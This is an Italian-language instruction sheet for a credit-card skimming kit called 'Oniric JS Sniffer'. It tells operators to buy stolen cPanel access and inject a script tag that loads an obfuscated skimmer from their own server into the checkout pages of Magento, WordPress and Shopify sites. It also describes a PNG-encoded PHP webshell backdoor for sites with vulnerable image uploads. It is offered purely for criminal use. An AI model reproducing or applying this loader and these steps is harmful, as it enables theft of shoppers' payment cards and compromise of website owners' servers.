Oniric JS Sniffer Versione 1

1) Prendere una vps e creare una nuova cartella
2) avviare l'eseguibile di Oniric: ./Oniric -c config.json
3) attendere che sia stato inizializzato completamente
4) seguire la modalità di infezione dei siti web

Modalità di aggancio dello SNIFFER:

- Andate su xleet.to oppure odin.to e comprate dei cPanels
- nel momento in cui avete dei cpanels a disposizione aggiungete codice HTML
alla pagina che segue:

<script type="text/javascript">
var g = document.createElement('script');
g.src = location.protocol + '//ip:porta/Sniff.js'
g.asynch = true;
document.getElementsByTagName('head')[0].appendChild(g)
</script>

- ip:porta corrispondono alla porta 3000 e l'ip della vps su cui è avviata l'applicazione
- il codice html è scritto in modo tale che ogni dove viene inserito per la DOM del browser
  risulterà sempre all'interno del tag head


Considerazioni sullo sniffer:

- Wordlist di parole che riguardano i sistemi del checkout presenti
  su magento, wordpress e shopify, qual'ora avrai la necessità  di sniffare dati su un sito diverso
  dovrai modificare config.json

- il timer è impostato a 3 secondi in modo tale che effettua il polling con il server per comunicare i dati

- Per diventare irriconoscibile all'occhio più attento è stato offuscato tramite un algoritmo
  che nasconde anche le parole chiave coinvolte nello sniff delle carte di credito

- Loggherà solo ciò che non ha trovato in precedenza se il dato cambia anche di poco , lo salverà nei logs



Considerazioni sulla backdoor :

- La backdoor riguarda solo i siti che utilizzano php, permette di eseguire dei comandi tramite una richiesta get
  sul primo parametro e richiesta post sul secondo parametro

- può essere caricata su qualsiasi cosa vi chieda l'upload di un immagine , se il sito è vulnerabile avrete una webshell

- è stata codificata in un immagine png riprendendo il PoC presente su 0Day.today al costo di 0.23BTC

- la codifica serve per bypassare i filtri 1 e 3 di GZDEFLATE in modo tale da salvare il codice della shell in chiaro
